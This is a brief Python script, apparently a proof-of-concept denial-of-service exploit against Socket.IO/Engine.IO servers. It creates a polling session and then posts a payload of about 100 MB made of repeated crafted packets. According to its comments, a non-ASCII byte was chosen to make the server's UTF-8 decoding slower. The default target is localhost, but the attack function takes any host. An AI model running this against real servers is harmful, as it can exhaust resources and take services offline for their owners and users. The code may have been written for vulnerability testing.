import re
import time

import requests


def make_payload(total_length, data_length=2):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # But putting a character >0x80 in data
    # slows down encoded_payload.decode('utf-8', errors='ignore') even more
    # data_length : data
    # e.g. '40:42["my event",{"data":"I\'m connected!"}]' * 20
    prefix = '4\xbc'
    assert data_length >= len(prefix)
    packet = '%d:%s' % (data_length, prefix + 'x' * (data_length - len(prefix)))
    repetitions = total_length // len(packet)
    return packet * repetitions


def timestr():
    return "&t=" + str(time.time())


def attack(host, payload_length=100000000):
    # engineio default max length is 10 meg
    base_url = host + "/socket.io/?EIO=3&transport=polling"
    # Create session
    response = requests.get(base_url + timestr()).text
    print("Response from server", repr(response))
    sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
    print("Got session", sid)
    session_url = base_url + "&sid=" + sid
    # Fire payload
    payload = make_payload(payload_length)
    print("Firing payload of length", len(payload), repr(payload[:100]))
    final_response = requests.post(
        session_url + timestr(),
        data=payload,
        headers={'Content-Type': 'text/plain'},
    ).text
    print("Server returned", repr(final_response))


def x(payload_length=100000000):
    return attack("http://127.0.0.1:5000", payload_length)
